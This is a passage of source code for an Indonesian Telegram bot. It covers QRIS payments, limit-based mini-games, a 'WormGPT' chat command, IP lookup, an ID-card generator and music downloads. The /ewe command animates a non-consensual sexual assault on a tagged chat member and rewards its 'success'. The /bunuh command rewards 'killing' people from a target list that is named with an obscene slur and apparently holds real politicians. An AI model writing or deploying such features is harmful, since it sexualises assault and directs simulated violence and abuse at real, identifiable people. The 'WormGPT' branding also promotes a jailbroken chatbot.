      `<blockquote>❌ <b>Format Salah!</b>\nGunakan:\n<code>/pay nominal</code>\nContoh:\n<code>/pay 50000</code></blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const nominal = parseInt(nominalStr);

  if (isNaN(nominal) || nominal < 1000) {
    return ctx.reply(
      `<blockquote>❌ <b>Nominal tidak valid!</b>\nMinimal pembayaran Rp1.000</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const orderId = `PAY${Date.now()}${userId}`;

  try {
    const loadingMsg = await ctx.reply(
      `<blockquote>⏳ <b>Membuat QRIS Pembayaran...</b></blockquote>`,
      { parse_mode: "HTML" }
    );

    // Create QRIS via Pakasir
    const { data } = await axios.post(
      "https://app.pakasir.com/api/transactioncreate/qris",
      {
        project: config.PAKASIR_PROJECT,
        order_id: orderId,
        amount: nominal,
        api_key: config.PAKASIR_API_KEY
      },
      { timeout: 10000 }
    );

    if (!data.payment || !data.payment.payment_number) {
      throw new Error("Gagal membuat QRIS");
    }

    const filePath = path.join(__dirname, `qris_${orderId}.png`);
    await QRCode.toFile(filePath, data.payment.payment_number, { 
      scale: 8,
      margin: 2
    });

    // Hapus loading message
    await ctx.deleteMessage(loadingMsg.message_id).catch(() => {});

    // Kirim QRIS
    const qrisMsg = await ctx.replyWithPhoto(
      { source: filePath },
      {
        caption: 
`<blockquote>🧾 <b>PEMBAYARAN VIA QRIS</b></blockquote>
<blockquote>🆔 <b>Order ID:</b> <code>${orderId}</code>
💰 <b>Nominal:</b> Rp${nominal.toLocaleString('id-ID')}
⏱️ <b>Expired:</b> 15 Menit

📌 Scan QRIS di atas untuk membayar</blockquote>`,
        parse_mode: "HTML"
      }
    );

    fs.unlinkSync(filePath);

    // Simpen data di memory sederhana
    const paymentData = {
      orderId,
      nominal,
      username,
      userId,
      chatId,
      qrisMessageId: qrisMsg.message_id,
      status: 'pending',
      timestamp: Date.now()
    };

    // Cek pembayaran
    const startTime = Date.now();
    const checkInterval = setInterval(async () => {
      try {
        const detail = await axios.get(
          "https://app.pakasir.com/api/transactiondetail",
          {
            params: {
              project: config.PAKASIR_PROJECT,
              order_id: orderId,
              amount: nominal,
              api_key: config.PAKASIR_API_KEY
            },
            timeout: 5000
          }
        );

        if (detail.data?.transaction?.status === "completed") {
          clearInterval(checkInterval);

          // Hapus pesan QRIS
          await ctx.telegram.deleteMessage(chatId, paymentData.qrisMessageId).catch(() => {});

          // Kirim struk pembayaran
          await paymentt(ctx, paymentData);

          await ctx.telegram.sendMessage(
            config.owner,
`<blockquote>💰 <b>PEMBAYARAN BERHASIL</b>
👤 User: ${username} (ID: ${userId})
💵 Nominal: Rp${nominal.toLocaleString('id-ID')}
🆔 Order ID: ${orderId}</blockquote>`,
            { parse_mode: "HTML" }
          );

          return;
        }

        // Cek expired (15 menit)
        if (Date.now() - startTime > 15 * 60 * 1000) {
          clearInterval(checkInterval);
          
          await ctx.telegram.deleteMessage(chatId, paymentData.qrisMessageId).catch(() => {});

          await ctx.reply(
            `<blockquote>❌ <b>QRIS telah expired</b>\n\nSilakan ulangi dengan /pay</blockquote>`,
            { parse_mode: "HTML" }
          );
        }

      } catch (err) {
        console.error("Payment check error:", err.message);
      }
    }, 5000); // Cek setiap 5 detik

  } catch (err) {
    console.error("Payment creation error:", err.response?.data || err.message);
    await ctx.reply(
      `<blockquote>❌ <b>Gagal membuat pembayaran:</b>\n${err.message}</blockquote>`,
      { parse_mode: "HTML" }
    );
  }
});

/// -------------------- [ Command : ewe ] -------------------- \\\
bot.command('ewe', async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    const entryCost = 1000;
    const userLimit = getUserLimit(userId);
    
    if (!isOwner(userId)) {
      if (userLimit.remaining < entryCost) {
        return ctx.reply(
          `<blockquote>❌ <b>Limit tidak cukup!</b></blockquote>\n\n<blockquote>💰 Biaya main: ${formatNumber(entryCost)} limit\n📊 Limit kamu: ${formatNumber(userLimit.remaining)}/${formatNumber(userLimit.dailyLimit)}\n\n💡 Upgrade ke premium untuk limit lebih banyak!</blockquote>`,
          { parse_mode: 'HTML' }
        );
      }
      deductUserLimit(userId, entryCost);
    }
    
    const args = ctx.message.text.split(' ');
    const tag = args[1];
    
    if (!tag || !tag.startsWith('@')) {
      return ctx.reply(`<blockquote>⚠️ <b>Tag seseorang!</b></blockquote>\n\n<blockquote>/ewe @username</blockquote>`, { parse_mode: 'HTML' });
    }
    
    const loadingMsg = await ctx.reply('<blockquote>🔄 <b>Memulai misi...</b></blockquote>', { parse_mode: 'HTML' });
    
    const frames = [
      '🦸 Sedang Mengikuti Target....',
      '👀 Sedang Mengawasi Target...',
      '🧛 Menangkap Target...',
      '🫦 Memaksakan Membuka Bajunya...',
      '💦 Sedang Memasukkan Burungku....',
      '😭 Target Berhasil Lemes...',
    ];
    
    for (let i = 0; i < frames.length; i++) {
      await new Promise((r) => setTimeout(r, 800));
      await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined, `<blockquote>${frames[i]}</blockquote>`, { parse_mode: 'HTML' });
    }
    
    const success = Math.random() < 0.5;
    const reward = 15000;
    const penalty = 7000;
    
    if (success) {
      const addResult = addUserLimit(userId, reward);
      const newUserLimit = getUserLimit(userId);
      
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        loadingMsg.message_id,
        undefined,
        `<blockquote>✅ <b>Misi Berhasil!</b></blockquote>\n<blockquote>🎯 Kamu berhasil ${tag}\n💰 Mendapatkan: +${formatNumber(reward)} LIMIT! 🎉\n📊 Total Limit: ${formatNumber(newUserLimit.remaining)}/${formatNumber(newUserLimit.dailyLimit)}\n\n🔁 Main lagi dengan /ewe @username</blockquote>`,
        {
          parse_mode: 'HTML',
          reply_markup: { inline_keyboard: [[{ text: '🔄 Coba Lagi', callback_data: `ewe_retry_${userId}_${encodeURIComponent(tag)}` }]] },
        }
      );
    } else {
      const currentLimit = getUserLimit(userId);
      if (currentLimit.remaining >= penalty) {
        deductUserLimit(userId, penalty);
      } else {
        if (currentLimit.remaining > 0) deductUserLimit(userId, currentLimit.remaining);
      }
      
      const newUserLimit = getUserLimit(userId);
      
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        loadingMsg.message_id,
        undefined,
        `<blockquote>😭 <b>Misi Gagal!</b></blockquote>\n<blockquote>🎯 Kamu gagal memasukkan anu ke ${tag}\n💸 Denda: -${formatNumber(penalty)} LIMIT\n📊 Sisa Limit: ${formatNumber(newUserLimit.remaining)}/${formatNumber(newUserLimit.dailyLimit)}\n\nIngin coba lagi?</blockquote>` +
        (currentLimit.remaining >= penalty ? '' : '\n<blockquote>⚠️ Limit tidak cukup untuk penalti lagi</blockquote>'),
        {
          parse_mode: 'HTML',
          reply_markup: { inline_keyboard: [[{ text: '🔄 Coba Lagi', callback_data: `ewe_retry_${userId}_${encodeURIComponent(tag)}` }]] },
        }
      );
    }
    
    console.log(chalk.cyan(`🎮 ${userId} played /ewe ${tag} - ${success ? 'SUCCESS' : 'FAILED'}`));
  } catch (error) {
    console.error(chalk.red(`❌ /ewe error: ${error.message}`));
    try {
      await ctx.reply(`<blockquote>❌ <b>Terjadi kesalahan!</b></blockquote>\n\n<blockquote>${error.message}</blockquote>`, { parse_mode: 'HTML' });
    } catch (e) { }
  }
});

/// -------------------- [ Command : upgrade ] -------------------- \\\
bot.command('upgrade', async (ctx) => {
  if (!(await checkUserLimit(ctx, 'upgrade'))) return;
  
  const userId = ctx.from.id.toString();
  ensureUserHasLimitData(userId);
  
  const args = ctx.message.text.split(' ');
  if (!args[1]) return ctx.reply('<blockquote>❌ Contoh: /upgrade Amerika Serikat</blockquote>', { parse_mode: 'HTML' });
  
  const countryName = args.slice(1).join(' ').toLowerCase();
  const country = countries.find((c) => c.name.toLowerCase() === countryName);
  
  if (!country) return ctx.reply('<blockquote>❌ Negara tidak ditemukan.</blockquote>', { parse_mode: 'HTML' });
  
  const cost = 10000;
  const currentLimit = getCurrentLimit(userId);
  
  if (currentLimit < cost) {
    return ctx.reply(`<blockquote>❌ LIMIT tidak cukup. Upgrade butuh ${cost} LIMIT.</blockquote>\n\n<blockquote>Current Limit: ${currentLimit.toLocaleString()}</blockquote>`, { parse_mode: 'HTML' });
  }
  
  deductFromLimit(userId, cost);
  country.basePower += 2;
  const newLimit = getCurrentLimit(userId);
  
  ctx.reply(`<blockquote>✅ ${country.name} berhasil diupgrade! Power sekarang: ${country.basePower}</blockquote>\n<blockquote>📉 LIMIT berkurang: ${cost.toLocaleString()}\n\nTotal Limit: ${newLimit.toLocaleString()}</blockquote>`, { parse_mode: 'HTML' });
});

/// -------------------- [ Command : perang ] -------------------- \\\
bot.command('perang', async (ctx) => {
  const userId = ctx.from.id.toString();
  ensureUserHasLimitData(userId);
  
  const args = ctx.message.text.split(' ');
  if (!args[1]) return ctx.reply('<blockquote>❌ Pilih negara. Contoh: /perang Amerika Serikat</blockquote>', { parse_mode: 'HTML' });
  
  const now = Date.now();
  const cdTime = 2 * 60 * 1000;
  
  if (perangCooldown[userId] && now - perangCooldown[userId] < cdTime) {
    const sisa = Math.ceil((cdTime - (now - perangCooldown[userId])) / 1000);
    return ctx.reply(`<blockquote>⏳ Kamu harus menunggu ${sisa} detik sebelum /perang lagi.</blockquote>`, { parse_mode: 'HTML' });
  }
  
  perangCooldown[userId] = now;
  
  const userCountryName = args.slice(1).join(' ').toLowerCase();
  const userCountry = countries.find((c) => c.name.toLowerCase() === userCountryName);
  
  if (!userCountry) return ctx.reply('<blockquote>❌ Negara tidak tersedia.</blockquote>', { parse_mode: 'HTML' });
  
  const enemyCountries = countries.filter((c) => c.name !== userCountry.name);
  const enemyCountry = enemyCountries[Math.floor(Math.random() * enemyCountries.length)];
  
  const loadingMsg = await ctx.reply(`<blockquote>🪖 Prajurit ${userCountry.name} sedang bergerak menuju ${enemyCountry.name}...</blockquote>`, { parse_mode: 'HTML' });
  
  const loadingSteps = [
    '🚶‍♂️🪖 Prajurit bergerak...',
    '🏞️🪖 Pasukan melewati pegunungan...',
    '🏕️🪖 Berkemah di perbatasan...',
    '⚔️🪖 Bersiap menyerang...',
    '💣☢️ Menyalakan Nuklir....',
  ];
  
  for (let step of loadingSteps) {
    await new Promise((res) => setTimeout(res, 1500));
    await ctx.telegram.editMessageText(loadingMsg.chat.id, loadingMsg.message_id, undefined, `<blockquote>${step}</blockquote>`, { parse_mode: 'HTML' });
  }
  
  const userScore = enemyCountry.rank / (userCountry.rank + enemyCountry.rank) + userCountry.basePower * 0.05;
  const enemyScore = userCountry.rank / (userCountry.rank + enemyCountry.rank) + enemyCountry.basePower * 0.05;
  const result = Math.random() < userScore ? 'menang' : 'kalah';
  
  if (result === 'menang') {
    addToLimit(userId, 15000);
    const newLimit = getCurrentLimit(userId);
    
    await ctx.telegram.editMessageText(
      loadingMsg.chat.id,
      loadingMsg.message_id,
      undefined,
      `<blockquote>🏆 ${userCountry.name} Menang melawan ${enemyCountry.name}!\n+15,000 LIMIT</blockquote>\n<blockquote>⏳ Cooldown 120 detik\n\nTotal Limit: ${newLimit.toLocaleString()}</blockquote>`,
      { parse_mode: 'HTML' }
    );
  } else {
    const currentLimit = getCurrentLimit(userId);
    const deduction = Math.min(10000, currentLimit);
    deductFromLimit(userId, deduction);
    const newLimit = getCurrentLimit(userId);
    
    await ctx.telegram.editMessageText(
      loadingMsg.chat.id,
      loadingMsg.message_id,
      undefined,
      `<blockquote>💀 ${userCountry.name} Kalah melawan ${enemyCountry.name}!\n-${deduction.toLocaleString()} LIMIT</blockquote>\n<blockquote>⏳ Cooldown 120 detik\n\nTotal Limit: ${newLimit.toLocaleString()}</blockquote>`,
      { parse_mode: 'HTML' }
    );
  }
});

/// -------------------- [ Command : bunuh ] -------------------- \\\
bot.command('bunuh', async (ctx) => {
  const text = ctx.message.text.split(' ').slice(1).join(' ');
  const userId = ctx.from.id.toString();
  ensureUserHasLimitData(userId);
  
  if (!text) return ctx.reply('<blockquote>❌ Contoh: /bunuh sahroni</blockquote>', { parse_mode: 'HTML' });
  
  if (jail[userId]) {
    const sisa = Math.ceil((jail[userId] - Date.now()) / 1000);
    return ctx.reply(`<blockquote>🚓 Kamu masih di penjara.</blockquote>\n<blockquote>Waktu tersisa: ${sisa} detik</blockquote>`, { parse_mode: 'HTML' });
  }
  
  const target = DprNgentod.find((n) => n.toLowerCase().includes(text.toLowerCase()));
  if (!target) return ctx.reply('<blockquote>❌ Orang itu tidak ditemukan dalam daftar target.</blockquote>', { parse_mode: 'HTML' });
  
  const success = Math.random() < 0.6;
  
  if (success) {
    addToLimit(userId, 12000);
    const newLimit = getCurrentLimit(userId);
    
    return ctx.reply(
      `<blockquote>🔪 Kamu berhasil membunuh <b>${target}!</b></blockquote>\n<blockquote>💰 Mendapat: 12,000 LIMIT\n\nTotal Limit: ${newLimit.toLocaleString()}</blockquote>`,
      {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: [[{ text: '📜 Daftar Tikus Kantor', callback_data: 'lihat_kontol' }]] },
      }
    );
  }
  
  const bebas = Date.now() + 10 * 60 * 1000;
  jail[userId] = bebas;
  
  ctx.reply(
    `<blockquote>🚓 <b>KAMU TERTANGKAP!</b></blockquote>\n<blockquote>Kamu gagal membunuh ${target} dan tertangkap polisi.\n\n⏳ Lama hukuman: 10 menit\n\nIngin tebus kebebasan? (100,000 LIMIT)</blockquote>`,
    {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [{ text: '💸 Tebus 100,000 LIMIT', callback_data: `tebus_${userId}` }],
          [{ text: '📜 Lihat Daftar Tikus', callback_data: 'lihat_kontol' }],
        ],
      },
    }
  );
});

/// -------------------- [ Command : listnegara ] -------------------- \\\
bot.command('listnegara', async (ctx) => {
  if (!(await checkUserLimit(ctx, 'listnegara'))) return;
  
  let msg = '<blockquote>🏅 <b>Daftar Negara & Rank Militer</b></blockquote>\n\n';
  countries.forEach((c, i) => {
    msg += `<blockquote>${i + 1}. ${c.name} - Rank ${c.rank} - Power: ${c.basePower}</blockquote>\n`;
  });
  msg += "<blockquote>\nGunakan /perang [nama negara] untuk memulai perang!</blockquote>";
  
  ctx.reply(msg, { parse_mode: 'HTML' });
});

/// -------------------- [ Command : wormgpt ] -------------------- \\\
bot.command('wormgpt', async (ctx) => {
  const text = ctx.message.text.split(' ').slice(1).join(' ').trim();
  if (!(await checkUserLimit(ctx, 'wormgpt'))) return;
  
  if (!text) return ctx.reply('<blockquote>❌ Berikan pertanyaan untuk WormGPT.</blockquote>\n<blockquote>Contoh: /wormgpt Apa itu artificial intelligence?</blockquote>', { parse_mode: 'HTML' });
  
  try {
    const waitMsg = await ctx.reply('<blockquote>🐛 WormGPT sedang berpikir...</blockquote>', { parse_mode: 'HTML' });
    const result = await wormgptChat(text);
    const escapedResult = escapeHTML(result);
    const maxLength = 4000;
    
    if (escapedResult.length > maxLength) {
      const part1 = escapedResult.substring(0, maxLength);
      const part2 = escapedResult.substring(maxLength);
      
      await ctx.telegram.deleteMessage(ctx.chat.id, waitMsg.message_id);
      await ctx.reply(`<blockquote>☘️ <b>WormGPT Response</b></blockquote>\n\n<blockquote>${part1}</blockquote>`, { parse_mode: 'HTML' });
      if (part2.length > 0) await ctx.reply(`<blockquote>${part2}</blockquote>`, { parse_mode: 'HTML' });
    } else {
      await ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, null, `<blockquote>☘️ <b>WormGPT Response</b></blockquote>\n\n<blockquote>${escapedResult}</blockquote>`, { parse_mode: 'HTML' });
    }
  } catch (e) {
    console.error('WormGPT Error:', e);
    let errorMessage = e.message || 'Unknown error';
    
    if (errorMessage.includes('API Error')) {
      errorMessage = 'API sedang bermasalah, coba lagi nanti';
    } else if (errorMessage.includes('No output content')) {
      errorMessage = 'Tidak mendapatkan respons dari AI';
    }
    
    try {
      if (waitMsg && waitMsg.message_id) {
        await ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, null, `<blockquote>❌ Error: ${escapeHTML(errorMessage)}</blockquote>`, { parse_mode: 'HTML' });
      }
    } catch (editError) {
      ctx.reply(`<blockquote>❌ Error: ${escapeHTML(errorMessage)}</blockquote>`, { parse_mode: 'HTML' });
    }
  }
});

/// -------------------- [ Command : tourl ] -------------------- \\\
bot.command('tourl', async (ctx) => {
  const reply = ctx.message.reply_to_message;
  if (!(await checkUserLimit(ctx, 'tourl'))) return;
  
  if (!reply) return ctx.reply('<blockquote>❌ Reply ke foto / video / audio / document dulu.</blockquote>', { parse_mode: 'HTML' });
  
  const file = reply.photo?.at(-1) || reply.video || reply.audio || reply.document;
  if (!file) return ctx.reply('<blockquote>❌ Media tidak didukung.</blockquote>', { parse_mode: 'HTML' });
  
  const key = Date.now().toString();
  memory[key] = {
    file_id: file.file_id,
    file_name: file.file_name || `file_${Date.now()}${reply.photo ? '.jpg' : reply.video ? '.mp4' : reply.audio ? '.mp3' : '.bin'}`,
  };
  
  await ctx.reply('<blockquote>🔗 Pilih uploader:</blockquote>', {
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [{ text: '☁️ KyzzUploader', callback_data: `tourl_kyzz_${key}` }],
        [{ text: '📦 Catbox', callback_data: `tourl_catbox_${key}` }],
        [{ text: '❌ Cancel', callback_data: `tourl_cancel_${key}` }],
      ],
    },
  });
});

/// -------------------- [ Command : tofigure ] -------------------- \\\
bot.command('tofigure', async (ctx) => {
  const apikey = 'kyzz';
  let imageUrl = null;
  
  if (!(await checkUserLimit(ctx, 'tofigure'))) return;
  
  if (ctx.message.reply_to_message?.photo) {
    const photo = ctx.message.reply_to_message.photo.pop();
    const fileLink = await ctx.telegram.getFileLink(photo.file_id);
    imageUrl = fileLink.href;
  } else {
    const args = ctx.message.text.split(' ').slice(1);
    if (!args[0]) return ctx.reply('<blockquote>❌ Kirim dengan cara:</blockquote>\n<blockquote>Reply foto + /tofigure</blockquote>', { parse_mode: 'HTML' });
    imageUrl = args[0];
  }
  
  try {
    const apiUrl = `https://api-ikyzxc.vercel.app/edit/tofigure?apikey=${apikey}&image=${encodeURIComponent(imageUrl)}`;
    const { data } = await axios.get(apiUrl);
    
    if (!data.status || !data.generated?.url) return ctx.reply('<blockquote>❌ Gagal membuat figure.</blockquote>', { parse_mode: 'HTML' });
    
    await ctx.replyWithPhoto({ url: data.generated.url }, { 
      caption: '<blockquote>🧸 <b>Figure Art Generated</b></blockquote>\n<blockquote>Provider: AldzyIsHere</blockquote>', 
      parse_mode: 'HTML' 
    });
  } catch (err) {
    console.error(err);
    ctx.reply('<blockquote>⚠️ Error njir, coba lagi.</blockquote>', { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : trackip ] -------------------- \\\
bot.command('trackip', async (ctx) => {
  const userId = ctx.from.id.toString();
  const chatType = ctx.chat.type;
  
  if (!(await checkUserLimit(ctx, 'trackip'))) return;
  
  const args = ctx.message.text.split(' ').filter(Boolean);
  if (!args[1]) {
    return ctx.reply('<blockquote>❌ Syntax Error!</blockquote>\n<blockquote>Example : /trackip 8.8.8.8</blockquote>', { parse_mode: 'HTML' });
  }
  
  const ip = args[1].trim();
  
  function isValidIPv4(ip) {
    const parts = ip.split('.');
    if (parts.length !== 4) return false;
    return parts.every((p) => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith('0')) return false;
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }
  
  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }
  
  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply('<blockquote>❌ ☇ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar</blockquote>', { parse_mode: 'HTML' });
  }
  
  await ctx.reply(`<blockquote>🔎 ☇ Tracking IP ${ip} — sedang memproses</blockquote>`, { parse_mode: 'HTML' });
  
  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;
    
    if (!data || data.success === false) {
      return await ctx.reply(`<blockquote>❌ ☇ Gagal mendapatkan data untuk IP: ${ip}</blockquote>`, { parse_mode: 'HTML' });
    }
    
    const lat = data.latitude || '';
    const lon = data.longitude || '';
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}` : null;
    
    const caption = `<blockquote>⬡═―—⊱ ⎧ Vyxxz ⎭ ⊰―—═⬡</blockquote>\n<blockquote>⟣ IP: ${data.ip || '-'}\n⟣ Country: ${data.country || '-'} ${data.country_code ? `(${data.country_code})` : ''}\n⟣ Region: ${data.region || '-'}\n⟣ City: ${data.city || '-'}\n⟣ ZIP: ${data.postal || '-'}\n⟣ Timezone: ${data.timezone_gmt || '-'}\n⟣ ISP: ${data.isp || '-'}\n⟣ Org: ${data.org || '-'}\n⟣ ASN: ${data.asn || '-'}\n⟣ Lat/Lon: ${lat || '-'}, ${lon || '-'}</blockquote>`;
    
    const inlineKeyboard = mapsUrl
      ? { reply_markup: { inline_keyboard: [[{ text: '⌜🌍⌟ Open Location', url: mapsUrl }]] } }
      : null;
    
    if (inlineKeyboard) {
      await ctx.reply(caption, { parse_mode: 'HTML', ...inlineKeyboard });
    } else {
      await ctx.reply(caption, { parse_mode: 'HTML' });
    }
    
    console.log(chalk.green(`✅ IP tracking completed for ${userId}`));
  } catch (error) {
    console.error(chalk.red(`❌ Track IP error: ${error.message}`));
    await ctx.reply('<blockquote>❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti</blockquote>', { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : info ] -------------------- \\\
bot.command('info', async (ctx) => {
  try {
    if (!(await checkUserLimit(ctx, 'info'))) return;
    
    const user = ctx.from;
    const chatId = ctx.chat.id;
    const messageId = ctx.message.message_id;
    const fullName = `${user.first_name || ''} ${user.last_name || ''}`.trim();
    const username = user.username ? `@${user.username}` : '-';
    const userId = user.id.toString();
    const today = moment().tz('Asia/Jakarta').format('YYYY-MM-DD');
    const dcId = (user.id >> 32) % 256;
    
    let photoUrl = null;
    
    try {
      const waitMsg = await ctx.reply('<blockquote>🔄 Prosesing...</blockquote>', { parse_mode: 'HTML' });
      const photos = await ctx.telegram.getUserProfilePhotos(user.id, { limit: 1 });
      
      if (photos.total_count > 0) {
        const fileId = photos.photos[0][0].file_id;
        const file = await ctx.telegram.getFile(fileId);
        photoUrl = `https://api.telegram.org/file/bot${ctx.telegram.token}/${file.file_path}`;
      }
      
      await ctx.telegram.deleteMessage(chatId, waitMsg.message_id);
    } catch (e) {
      console.log('Gagal ambil foto profil:', e.message);
    }
    
    const canvas = createCanvas(800, 450);
    const ctxCanvas = canvas.getContext('2d');
    
    const gradient = ctxCanvas.createLinearGradient(0, 0, canvas.width, canvas.height);
    gradient.addColorStop(0, '#0a4f44');
    gradient.addColorStop(1, '#128C7E');
    
    ctxCanvas.fillStyle = gradient;
    ctxCanvas.fillRect(0, 0, canvas.width, canvas.height);
    ctxCanvas.fillStyle = 'rgba(255, 255, 255, 0.9)';
    
    if (!ctxCanvas.roundRect) {
      ctxCanvas.roundRect = function (x, y, width, height, radius) {
        if (width < 2 * radius) radius = width / 2;
        if (height < 2 * radius) radius = height / 2;
        this.beginPath();
        this.moveTo(x + radius, y);
        this.arcTo(x + width, y, x + width, y + height, radius);
        this.arcTo(x + width, y + height, x, y + height, radius);
        this.arcTo(x, y + height, x, y, radius);
        this.arcTo(x, y, x + width, y, radius);
        this.closePath();
        return this;
      };
    }
    
    ctxCanvas.roundRect(40, 40, canvas.width - 80, canvas.height - 80, 20);
    ctxCanvas.fill();
    
    ctxCanvas.fillStyle = '#0a4f44';
    ctxCanvas.font = 'bold 32px Arial';
    ctxCanvas.textAlign = 'center';
    ctxCanvas.fillText('ID CARD TELEGRAM', canvas.width / 2, 80);
    
    ctxCanvas.strokeStyle = '#0a4f44';
    ctxCanvas.lineWidth = 2;
    ctxCanvas.beginPath();
    ctxCanvas.moveTo(50, 100);
    ctxCanvas.lineTo(canvas.width - 50, 100);
    ctxCanvas.stroke();
    
    if (photoUrl) {
      try {
        const response = await axios.get(photoUrl, { responseType: 'arraybuffer' });
        const avatar = await loadImage(response.data);
        
        ctxCanvas.save();
        ctxCanvas.beginPath();
        ctxCanvas.arc(150, 220, 70, 0, Math.PI * 2, true);
        ctxCanvas.closePath();
        ctxCanvas.clip();
        ctxCanvas.drawImage(avatar, 80, 150, 140, 140);
        ctxCanvas.restore();
        
        ctxCanvas.strokeStyle = '#0a4f44';
        ctxCanvas.lineWidth = 3;
        ctxCanvas.beginPath();
        ctxCanvas.arc(150, 220, 70, 0, Math.PI * 2, true);
        ctxCanvas.stroke();
      } catch (e) {
        console.log('Gagal memuat gambar:', e.message);
        ctxCanvas.fillStyle = '#ccc';
        ctxCanvas.beginPath();
        ctxCanvas.arc(150, 220, 70, 0, Math.PI * 2, true);
        ctxCanvas.fill();
      }
    } else {
      ctxCanvas.fillStyle = '#ccc';
      ctxCanvas.beginPath();
      ctxCanvas.arc(150, 220, 70, 0, Math.PI * 2, true);
      ctxCanvas.fill();
    }
    
    ctxCanvas.textAlign = 'left';
    ctxCanvas.fillStyle = '#333';
    ctxCanvas.font = 'bold 24px Arial';
    ctxCanvas.fillText('Informasi Pengguna:', 280, 150);
    ctxCanvas.font = '20px Arial';
    ctxCanvas.fillText(`Nama: ${fullName}`, 280, 190);
    ctxCanvas.fillText(`User ID: ${userId}`, 280, 220);
    ctxCanvas.fillText(`Username: ${username}`, 280, 250);
    ctxCanvas.fillText(`Tanggal: ${today}`, 280, 280);
    ctxCanvas.fillText(`DC ID: ${dcId}`, 280, 310);
    
    ctxCanvas.textAlign = 'center';
    ctxCanvas.font = 'italic 16px Arial';
    ctxCanvas.fillStyle = '#666';
    ctxCanvas.fillText('ID Card by AldzyIsHere Bot', canvas.width / 2, canvas.height - 50);
    
    const buffer = canvas.toBuffer('image/png');
    const caption = `<blockquote>👤 <b>Nama:</b> ${fullName}\n🆔 <b>User ID:</b> ${userId}\n🌐 <b>Username:</b> ${username}\n📅 <b>Tanggal:</b> ${today}\n🏢 <b>DC ID:</b> ${dcId}</blockquote>`;
    
    await ctx.replyWithPhoto(
      { source: buffer },
      {
        caption: caption,
        parse_mode: 'HTML',
        reply_to_message_id: messageId,
        reply_markup: { inline_keyboard: [[{ text: 'BUY SCRIPT', url: 'https://t.me/ReyValdz' }]] },
      }
    );
  } catch (err) {
    console.error('Gagal generate ID card:', err.message);
    ctx.reply('<blockquote>❌ Gagal generate ID card. Silakan coba lagi.</blockquote>', { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : scsearch ] -------------------- \\\
bot.command('scsearch', async (ctx) => {
  const query = ctx.message.text.split(' ').slice(1).join(' ');
  if (!(await checkUserLimit(ctx, 'scsearch'))) return;
  
  if (!query) return ctx.reply('<blockquote>❌ Gunakan: /scsearch Judul</blockquote>', { parse_mode: 'HTML' });
  
  try {
    const q = encodeURIComponent(query);
    const { data } = await axios.get(`https://api-ikyyofficiall-latest.vercel.app/search/soundcloud?apikey=kyzz&query=${q}`);
    
    if (!data.status || !data.result.length) return ctx.reply('<blockquote>❌ Tidak ditemukan hasil!</blockquote>', { parse_mode: 'HTML' });
    
    const item = data.result[0];
    const id = 'SC' + Math.random().toString(36).slice(2, 12);
    scTemp[id] = item.permalink_url;
    
    await ctx.replyWithPhoto(
      { url: item.artwork_url },
      {
        caption: `<blockquote>🎧 <b>${item.permalink}</b></blockquote>\n<blockquote>🔗 ${item.permalink_url}\n\n⏳ Durasi: ${Math.floor(item.duration / 1000)} detik\n👁️ Play Count: ${item.playback_count}\n\nKlik tombol di bawah untuk download audionya.</blockquote>`,
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: [[{ text: '⬇️ Download Audio', callback_data: `scdl_${id}` }]] },
      }
    );
  } catch (err) {
    console.log(err);
    ctx.reply('<blockquote>❌ Terjadi kesalahan server.</blockquote>', { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : play ] -------------------- \\\
bot.command('play', async (ctx) => {
  try {
    let query;
    if (!(await checkUserLimit(ctx, 'play'))) return;
    
    if (ctx.message.reply_to_message?.text) {
      query = ctx.message.reply_to_message.text;
    } else {
      query = ctx.message.text.split(' ').slice(1).join(' ');
    }
    
    if (!query) return ctx.reply('<blockquote>❌ Masukkan judul lagu!</blockquote>\n<blockquote>Contoh: /play Kau masih kekasihku</blockquote>', { parse_mode: 'HTML' });
    
    const api = `https://api.deline.web.id/downloader/ytplay?q=${encodeURIComponent(query)}`;
    const res = await axios.get(api);
    
    if (!res || res.status !== 200) return ctx.reply('<blockquote>❌ Gagal akses API.</blockquote>', { parse_mode: 'HTML' });
    
    const json = res.data;
    if (!json.status) return ctx.reply('<blockquote>❌ Lagu tidak ditemukan.</blockquote>', { parse_mode: 'HTML' });
    
    const data = json.result;
    
    await ctx.replyWithPhoto({ url: data.thumbnail }, { 
      caption: `<blockquote>🎵 Judul: ${data.title}</blockquote>\n<b>📺 YouTube: ${data.url}\n🎧 Kualitas: ${data.pick.quality}\n📦 Size: ${data.pick.size}</b>`, 
      parse_mode: 'HTML' 
    });
    
    await ctx.replyWithAudio({ url: data.dlink }, { 
      title: data.title, 
      performer: 'YouTube Audio', 
      thumb: { url: data.thumbnail } 
    });
  } catch (e) {
    console.error(e);
